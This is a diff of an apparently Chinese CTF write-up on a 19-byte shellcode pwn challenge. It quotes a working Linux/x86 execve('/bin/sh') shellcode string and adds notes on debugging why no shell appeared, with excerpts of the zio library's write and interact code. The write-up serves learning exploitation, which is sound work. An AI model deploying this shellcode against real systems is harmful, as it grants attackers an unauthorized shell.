@@ -41,38 +41,9 @@ title: Pwn Challenge 0
 
 这个题的设定很刻意，现实中恐怕见不到这么明显的漏洞了。大概说一下，就是我们输入的内容会被当做指令执行，然而我们最多只能输入19个字节。输入的东西就直接是shellcode，也不用劫持控制流了（也劫持不了，19个字节不够覆盖到返回地址）。现在就考虑找一段shellcode。
 
-[Exploit-db](https://www.exploit-db.com/shellcode/)在这时就显得非常有用了。可以直接找指定长度的shellcode。我找了一个19字节的：
+[Exploit-db](https://www.exploit-db.com/exploits/41757/)在这时就显得非常有用了。可以直接找指定长度的shellcode。我找了一个19字节的：
 
 ```
-;================================================================================
-; The MIT License
-;
-; Copyright (c) <year> <copyright holders>
-;
-; Permission is hereby granted, free of charge, to any person obtaining a copy
-; of this software and associated documentation files (the "Software"), to deal
-; in the Software without restriction, including without limitation the rights
-; to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-; copies of the Software, and to permit persons to whom the Software is
-; furnished to do so, subject to the following conditions:
-; 
-; The above copyright notice and this permission notice shall be included in
-; all copies or substantial portions of the Software.
-; 
-; THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-; IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-; FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-; AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-; LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
-; OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
-; THE SOFTWARE.
-;================================================================================
-;     Name : Linux/x86 - execve(/bin/sh") shellcode (19 bytes)
-;     Author : WangYihang
-;     Email : wangyihanger@gmail.com
-;     Tested on: Linux_x86
-;     Shellcode Length: 19
-;================================================================================
 ; Shellcode : 
 char shellcode[] = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
 ;================================================================================
@@ -195,7 +166,71 @@ gdb-peda$ x/10x $esp
 0xbffff660:     0x6e69622f      0x68732f2f      0x00000000      
 ```
 
-感觉没问题呀，shellcode也是有效的。这是为什么呢？留坑吧。
+感觉没问题呀，shellcode也是有效的。这是为什么呢？
+
+后来我们进行了一个测试，编写一个简单地`/bin/zz`，功能是打印`123`，然后把 shellcode 改为运行这个程序，结果成功运行并打印。但是 shell 却一直起不来。
+
+因为用`zio`能够成功，我们找来`zio`的源码看一下：
+
+首先是`zio.write()`：
+
+{% highlight python %}
+def write(self, s):
+    if not s: return 0
+    if self.mode() == SOCKET:
+        if self.print_write: stdout(self._print_write(s))
+        self.sock.sendall(s)
+    return len(s)
+{% endhighlight %}
+
+然后是`zio.interact()`：
+
+{% highlight python %}
+if self.mode() == SOCKET: # socket
+    while self.isalive():
+        try:
+            r, w, e = self.__select([self.rfd, pty.STDIN_FILENO], [], [])
+        except KeyboardInterrupt:
+            break
+        if self.rfd in r:
+            try:
+                data = None
+                data = self._read(1024)
+                if data:
+                    if output_filter: data = output_filter(data)
+                    stdout(raw_rw and data or self._print_read(data))
+                else:       # EOF
+                    self.flag_eof = True
+                    break
+            except EOF:
+                self.flag_eof = True
+                break
+        if pty.STDIN_FILENO in r:
+            try:
+                data = None
+                data = os.read(pty.STDIN_FILENO, 1024)
+            except OSError as e:
+                # the subprocess may have closed before we get to reading it
+                if e.errno != errno.EIO:
+                    raise
+            if data is not None:
+                if input_filter: data = input_filter(data)
+                i = input_filter and -1 or data.rfind(escape_character)
+                if i != -1: data = data[:i]
+                try:
+                    while data != b'' and self.isalive():
+                        n = self._write(data)
+                        data = data[n:]
+                    if i != -1:
+                        break
+                except:         # write error, may be socket.error, Broken pipe
+                    break
+    return
+{% endhighlight%}
+
+上面就是一个标准的 select 模型，如果 socket 可读，就读出并打印到标准输出；如果标准输入可读，就读取标准输入，并发送到 socket。
+
+看来并没有特别之处。不过`zio`类的构造函数倒是很长，改日继续分析吧。
 
 ### 附录
 
